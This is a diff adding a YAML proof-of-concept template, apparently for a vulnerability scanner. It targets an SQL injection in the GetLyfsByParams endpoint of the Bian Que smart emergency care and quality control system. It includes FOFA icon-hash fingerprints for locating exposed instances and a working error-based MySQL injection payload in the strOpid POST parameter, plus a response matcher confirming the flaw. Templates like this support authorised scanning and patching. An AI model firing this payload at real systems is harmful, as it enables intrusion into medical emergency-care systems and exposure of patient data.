@@ -1,0 +1,21 @@
+id: poc-yaml-bian-que-ivtbq-ieqcs-getlyfsbyparams-sqli
+info:
+  name: 扁鹊飞救智能急救与质控系统 GetLyfsByParams SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 扁鹊飞救智能急救与质控系统
+  fofa: icon_hash="-757866684" || icon_hash="-1206146847"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetLyfsByParams
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: strOpid=1 AND (SELECT 9054 FROM(SELECT COUNT(*),CONCAT(md5({{.t1}}),FLOOR(RAND(0)*2))x
+    FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&strTempID=1&strNumber=&strUnit=
+  expression: status_code == 500 && contains(body,t2) && contains(body,"Duplicate
+    entry") && contains(body,"for key") && !contains(body,"<")
+transport: http
